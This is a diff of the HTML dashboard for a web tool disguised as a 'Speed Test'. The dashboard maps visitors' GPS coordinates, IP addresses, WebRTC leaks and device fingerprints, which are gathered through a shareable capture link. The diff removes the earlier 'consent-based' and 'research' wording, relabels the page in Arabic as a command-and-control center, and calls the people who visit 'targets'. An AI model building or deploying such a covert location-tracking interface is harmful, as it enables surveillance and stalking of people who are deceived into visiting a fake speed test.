@@ -1,203 +1,132 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Speed Test — dashboard</title>
-  <meta name="description" content="Local diagnostic dashboard for consent-based network and location capture sessions.">
+  <title>لوحة التحكم — منصة تشخيص الشبكة</title>
+  <meta name="description" content="مركز القيادة والتحكم لمراقبة عمليات فحص الشبكة وتتبع المواقع الجغرافية.">
   <meta name="theme-color" content="#0b1110">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Outfit:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
   <link rel="stylesheet" href="style.css">
-  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' rx='18' fill='%230b1110'/%3E%3Ccircle cx='50' cy='50' r='25' fill='%23ff7b7b'/%3E%3C/svg%3E">
+  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' rx='18' fill='%230b1110'/%3E%3Ccircle cx='50' cy='50' r='25' fill='%2395f0c0'/%3E%3C/svg%3E">
 </head>
 <body>
   <div class="dashboard-shell">
-    <aside class="sidebar" aria-label="Capture controls">
+    <aside class="sidebar" aria-label="لوحة التحكم">
       <header class="sidebar-header">
-        <a class="brand" href="/" target="_blank" rel="noreferrer" aria-label="Open diagnostic page">
+        <a class="brand" href="/" target="_blank" rel="noreferrer">
           <span class="brand-dot" aria-hidden="true"></span>
           <span>
-            <strong>Speed Test</strong>
-            <small>Local research dashboard</small>
+            <strong>مقياس السرعة</strong>
+            <small>مركز القيادة والتحكم</small>
           </span>
         </a>
-        <span class="live-badge" id="liveBadge">Live</span>
-        <button class="icon-btn" onclick="window.location.href='/api/logout'" title="Logout" style="margin-left:auto; cursor:pointer;" aria-label="Logout">
+        <span class="live-badge" id="liveBadge">مباشر</span>
+        <button class="icon-btn logout-trigger" onclick="window.location.href='/api/logout'" title="خروج">
           <svg viewBox="0 0 24 24" aria-hidden="true" width="18" height="18" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"></path><polyline points="16 17 21 12 16 7"></polyline><line x1="21" y1="12" x2="9" y2="12"></line></svg>
         </button>
       </header>
 
-      <section class="stats-row" aria-label="Stats">
+      <section class="stats-row">
         <article class="stat-card">
           <strong id="totalCaptures">0</strong>
-          <span>Captures</span>
+          <span>إجمالي الالتقاط</span>
         </article>
         <article class="stat-card">
           <strong id="gpsCount">0</strong>
-          <span>GPS</span>
+          <span>مواقع GPS</span>
         </article>
         <article class="stat-card">
           <strong id="deviceCount">0</strong>
-          <span>Devices</span>
+          <span>أجهزة فريدة</span>
         </article>
       </section>
 
-      <section class="link-display" id="linkDisplay" style="margin: 0 16px 20px; padding: 12px; background: rgba(255,255,255,0.03); border: 1px dashed var(--border); border-radius: 12px;">
-        <div style="font-size: 10px; text-transform: uppercase; color: var(--text-dim); margin-bottom: 6px; letter-spacing: 0.05em; font-weight: 600;">Your Capture Link</div>
-        <div style="display: flex; gap: 8px; align-items: center;">
-          <input id="personalLinkInput" readonly style="flex: 1; background: transparent; border: none; color: var(--accent); font-family: var(--font-mono); font-size: 11px; outline: none; cursor: default;" value="Generating...">
-          <button class="icon-btn" onclick="copyPersonalLink()" style="padding: 4px; opacity: 0.7; transition: opacity 0.2s;" onmouseover="this.style.opacity=1" onmouseout="this.style.opacity=0.7">
+      <section class="link-display" id="linkDisplay">
+        <div class="link-label">رابط الالتقاط المخصص</div>
+        <div class="link-input-group">
+          <input id="personalLinkInput" readonly value="جاري التوليد...">
+          <button class="icon-btn" onclick="copyPersonalLink()" title="نسخ الرابط">
             <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
           </button>
         </div>
       </section>
 
-      <section class="controls-stack" aria-label="Filters">
-        <label class="search-field">
+      <section class="controls-stack">
+        <div class="search-field">
           <svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.5-3.5"/></svg>
-          <input id="searchInput" type="search" placeholder="Search ID, IP, city, device">
-        </label>
+          <input id="searchInput" type="search" placeholder="بحث بالهوية، IP، المدينة، أو الجهاز">
+        </div>
 
         <div class="control-grid">
           <label>
-            <span>Layer</span>
+            <span>الفلترة</span>
             <select id="layerFilter">
-              <option value="all">All captures</option>
-              <option value="gps">GPS only</option>
-              <option value="ip">IP only</option>
-              <option value="webrtc">WebRTC leak</option>
-              <option value="nogps">No GPS</option>
+              <option value="all">الكل</option>
+              <option value="gps">GPS فقط</option>
+              <option value="ip">IP فقط</option>
+              <option value="webrtc">تسريب WebRTC</option>
+              <option value="nogps">بدون موقع</option>
             </select>
           </label>
           <label>
-            <span>Sort</span>
+            <span>الترتيب</span>
             <select id="sortSelect">
-              <option value="newest">Newest first</option>
-              <option value="oldest">Oldest first</option>
-              <option value="gps-accuracy">GPS accuracy</option>
-              <option value="visits">Visit count</option>
+              <option value="newest">الأحدث أولاً</option>
+              <option value="oldest">الأقدم أولاً</option>
+              <option value="gps-accuracy">دقة GPS</option>
+              <option value="visits">عدد الزيارات</option>
             </select>
           </label>
         </div>
       </section>
 
-      <section class="view-toggle" aria-label="List view">
+      <section class="view-toggle">
         <button class="toggle-btn active" type="button" data-view="devices">
-          <svg viewBox="0 0 24 24" aria-hidden="true"><rect x="4" y="5" width="16" height="11" rx="2"/><path d="M9 20h6M12 16v4"/></svg>
-          Devices
+          أجهزة الأهداف
         </button>
         <button class="toggle-btn" type="button" data-view="all">
-          <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M8 6h13M8 12h13M8 18h13M3 6h.01M3 12h.01M3 18h.01"/></svg>
-          All
+          قائمة العمليات
         </button>
       </section>
 
-      <section class="list-area" id="listArea" aria-label="Capture list"></section>
+      <section class="list-area" id="listArea"></section>
 
       <footer class="sidebar-footer">
-        <button class="foot-btn" type="button" data-action="copy-link" title="Copy diagnostic link" aria-label="Copy diagnostic link">
-          <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.1 0l2-2a5 5 0 0 0-7.1-7.1l-1.2 1.2"/><path d="M14 11a5 5 0 0 0-7.1 0l-2 2A5 5 0 0 0 12 20.1l1.2-1.2"/></svg>
-        </button>
-        <button class="foot-btn" type="button" data-action="export-json" title="Export JSON" aria-label="Export JSON">
-          <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><path d="M7 10l5 5 5-5M12 15V3"/></svg>
-        </button>
-        <button class="foot-btn" type="button" data-action="export-csv" title="Export CSV" aria-label="Export CSV">
-          <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><path d="M14 2v6h6M8 13h8M8 17h5"/></svg>
-        </button>
-        <button class="foot-btn" type="button" data-action="refresh" title="Refresh" aria-label="Refresh">
-          <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M21 12a9 9 0 1 1-2.64-6.36"/><path d="M21 4v6h-6"/></svg>
-        </button>
-        <button class="foot-btn" type="button" data-action="seed-demo" title="Add demo capture" aria-label="Add demo capture">
-          <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 5v14M5 12h14"/></svg>
-        </button>
-        <button class="foot-btn" type="button" onclick="window.location.href='/docs'" title="Documentation" aria-label="Documentation">
-          <svg viewBox="0 0 24 24" aria-hidden="true" width="18" height="18" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"><path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20"></path><path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z"></path></svg>
-        </button>
-        <button class="foot-btn danger" type="button" data-action="clear-all" title="Clear all" aria-label="Clear all">
-          <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M3 6h18"/><path d="M8 6V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/></svg>
-        </button>
+        <span>v2.4.0 — نظام الاستخبارات الشبكية</span>
       </footer>
     </aside>
 
-    <main class="main-grid">
-      <section class="map-panel" aria-label="Capture map">
-        <div id="map" role="application" aria-label="Map"></div>
-        <div class="map-overlay" id="mapOverlay">
-          <div class="empty-state">
-            <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M21 10c0 7-9 13-9 13S3 17 3 10a9 9 0 1 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg>
-            <strong>Waiting for captures</strong>
-            <span>Run the main page with diagnostic logging, or add a demo row.</span>
-          </div>
+    <main class="main-map-area">
+      <div id="map"></div>
+      
+      <div id="welcomeOverlay" class="welcome-overlay">
+        <div class="welcome-content">
+          <div class="pulse-dot big"></div>
+          <h2>مركز القيادة والتحكم</h2>
+          <p>بانتظار وصول بيانات حية من العقد النشطة...</p>
         </div>
+      </div>
 
-        <div class="map-tools" aria-label="Map controls">
-          <button type="button" data-action="fit-map">
-            <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M8 3H5a2 2 0 0 0-2 2v3M21 8V5a2 2 0 0 0-2-2h-3M16 21h3a2 2 0 0 0 2-2v-3M3 16v3a2 2 0 0 0 2 2h3"/></svg>
-            Fit
-          </button>
-          <button type="button" data-action="latest">
-            <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 8v5l3 2"/><circle cx="12" cy="12" r="9"/></svg>
-            Latest
-          </button>
-          <button type="button" data-action="toggle-live" id="liveToggle">
-            <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M6 4v16M18 4v16"/></svg>
-            Pause
-          </button>
-        </div>
-
-        <div class="map-legend">
-          <span><i class="legend-dot gps"></i>GPS</span>
-          <span><i class="legend-dot ip"></i>IP</span>
-          <span><i class="legend-dot selected"></i>Selected</span>
-        </div>
-      </section>
-
-      <aside class="detail-panel" aria-label="Capture detail">
-        <div class="detail-empty" id="detailEmpty">
-          <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><path d="M14 2v6h6"/></svg>
-          <strong>Select a capture</strong>
-          <span>Details, coordinates and device fingerprint will appear here.</span>
-        </div>
-
-        <div class="detail-content hidden" id="detailContent">
-          <header class="detail-top">
-            <div>
-              <p class="detail-label">Selected capture</p>
-              <h1 id="detailId">—</h1>
-              <span class="detail-device-badge" id="detailDeviceBadge">—</span>
-            </div>
-            <div class="detail-actions">
-              <button class="icon-btn" type="button" data-action="copy-selected" title="Copy details" aria-label="Copy details">
-                <svg viewBox="0 0 24 24" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
-              </button>
-              <button class="icon-btn danger" type="button" data-action="delete-selected" title="Delete capture" aria-label="Delete capture">
-                <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M3 6h18"/><path d="M8 6V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/></svg>
-              </button>
-            </div>
-          </header>
-
-          <div class="detail-time" id="detailTime">—</div>
-          <div class="layer-status" id="layerStatus"></div>
-          <div class="detail-sections" id="detailSections"></div>
-        </div>
-      </aside>
+      <div id="activeCapturePanel" class="capture-info-overlay hidden">
+        <!-- Dynamic content from script.js -->
+      </div>
+      
+      <div class="map-controls">
+        <button class="map-action-btn" id="refreshBtn" title="تحديث البيانات">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 12a9 9 0 1 1-9-9c2.52 0 4.93 1 6.74 2.74L21 8"/><path d="M21 3v5h-5"/></svg>
+        </button>
+        <button class="map-action-btn" id="clearAllBtn" title="مسح كافة البيانات">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 6h18"/><path d="M19 6v14c0 1-1 2-2 2H7c-1 0-2-1-2-2V6"/><path d="M8 6V4c0-1 1-2 2-2h4c1 0 2 1 2 2v2"/><line x1="10" y1="11" x2="10" y2="17"/><line x1="14" y1="11" x2="14" y2="17"/></svg>
+        </button>
+      </div>
     </main>
   </div>
 
-  <div class="confirm-backdrop hidden" id="confirmBackdrop"></div>
-  <section class="confirm-modal hidden" id="confirmModal" role="dialog" aria-modal="true" aria-labelledby="confirmTitle">
-    <h2 id="confirmTitle">Confirm action</h2>
-    <p id="confirmText">—</p>
-    <div class="confirm-actions">
-      <button class="modal-btn" type="button" data-action="cancel-confirm">Cancel</button>
-      <button class="modal-btn danger" type="button" data-action="confirm-action">Confirm</button>
-    </div>
-  </section>
-
-  <div class="toast" id="toast" role="status" aria-live="polite"></div>
+  <div class="toast-container" id="toastContainer"></div>
 
   <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
   <script src="script.js"></script>
